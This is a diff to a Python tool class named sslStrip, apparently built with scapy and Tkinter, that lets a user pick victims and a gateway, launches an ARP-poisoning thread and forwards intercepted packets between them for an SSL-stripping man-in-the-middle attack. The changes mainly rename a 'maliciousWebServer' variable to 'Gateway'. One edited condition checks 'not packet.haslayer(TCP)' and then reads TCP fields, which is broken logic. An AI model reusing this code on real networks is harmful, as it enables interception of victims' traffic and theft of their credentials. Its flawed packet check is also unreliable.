@@ -23,13 +23,13 @@ class sslStrip():
         self.root = root
         
     def selMalWebSrv(self):
-        self.maliciousWebServer = []
+        self.Gateway = []
         for widget in self.root.winfo_children():
             widget.destroy()
         OPTIONS = []
         for pktSnd, pktRcv in self.usedIPs:
             OPTIONS.append(pktRcv[ARP].psrc)
-        Label(self.root, text='Select the WebServer').pack()
+        Label(self.root, text='Select the Gateway').pack()
         selectTargetIP = Listbox(self.root, selectmode="single", width=50)
         for each_item in range(len(OPTIONS)):
             selectTargetIP.insert(END, OPTIONS[each_item])
@@ -38,7 +38,7 @@ class sslStrip():
         def get_target(self):
             for i in selectTargetIP.curselection():
                 InIpArp = int(i)
-                self.maliciousWebServer.append({"ip": self.usedIPs[InIpArp][1][ARP].psrc, "mac": self.usedIPs[InIpArp][1][ARP].hwsrc})
+                self.Gateway.append({"ip": self.usedIPs[InIpArp][1][ARP].psrc, "mac": self.usedIPs[InIpArp][1][ARP].hwsrc})
             self.myMAC = get_if_hwaddr(self.interface)
             proc_thread = None
             proc_thread = threading.Thread(target=self.startProcess)
@@ -124,14 +124,14 @@ class sslStrip():
 
     def initThread(self):
         proc_thread = None
-        process = poison(self.interface, self.target, self.maliciousWebServer, self.myMAC)
+        process = poison(self.interface, self.target, self.Gateway, self.myMAC)
         proc_thread = threading.Thread(target=process.poison)
         proc_thread.daemon = True
         proc_thread.start()
 		
     def packetForwarding(self, packet):
         
-        if not TCP in packet and packet[TCP].dport == 80 and packet[TCP].flags == 'S' and (packet[IP].src in [victim["IP"] for victim in self.target]):
+        if not packet.haslayer(TCP) and packet[TCP].dport == 80 and packet[TCP].flags == 'S' and (packet[IP].src in [victim["IP"] for victim in self.target]):
             sender= None
             senderfound = False
             receiver = None
@@ -139,11 +139,11 @@ class sslStrip():
             for vict in self.target:
                 if (vict["mac"] == packet[Ether].src):
                     sender, senderfound = self.SndFound(vict)
-                    if (self.maliciousWebServer[0]["ip"] == packet[IP].dst):
-                        receiver, receiverfound = self.rcvFound(self.maliciousWebServer[0])
+                    if (self.Gateway[0]["ip"] == packet[IP].dst):
+                        receiver, receiverfound = self.rcvFound(self.Gateway[0])
             if ((not senderfound) or (not receiverfound)):
-                if (self.maliciousWebServer[0]["mac"] == packet[Ether].src):
-                    sender, senderfound = self.SndFound(self.maliciousWebServer[0])
+                if (self.Gateway[0]["mac"] == packet[Ether].src):
+                    sender, senderfound = self.SndFound(self.Gateway[0])
                     for vict in self.target:
                         if (vict["ip"] == packet[IP].dst):
                             receiver, receiverfound = self.rcvFound(vict)
@@ -194,10 +194,10 @@ class sslStrip():
         self.show.see(END)
         self.show.update_idletasks()
 
-    def setInput(self, rangeIPs, usedIPs, target, maliciousWebServer, myMAC):
+    def setInput(self, rangeIPs, usedIPs, target, Gateway, myMAC):
         self.rangeIPs = rangeIPs
         self.usedIPs = usedIPs
         self.target = target
-        self.maliciousWebServer = maliciousWebServer
+        self.Gateway = Gateway
         self.myMAC = myMAC
     
